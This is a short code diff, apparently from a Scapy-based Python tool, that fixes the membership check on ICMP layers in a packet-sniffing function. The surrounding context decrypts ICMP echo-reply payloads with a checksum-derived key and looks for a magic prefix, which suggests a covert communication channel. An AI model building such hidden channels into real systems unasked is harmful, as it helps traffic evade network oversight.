@@ -70,7 +70,7 @@ def build_pkt(src, dst, data, key_info):
 def sniff_packet(pkt):
    global magic 
 
-   if pkt[ICMP] and pkt[ICMP].chksum and pkt[ICMP].type == 0 and pkt[ICMP].code == 0:
+   if ICMP in pkt and pkt[ICMP].chksum and pkt[ICMP].type == 0 and pkt[ICMP].code == 0:
       data = crypt_data(pkt.load, generate_key(pkt[ICMP].chksum))
 
       if data.startswith(magic):
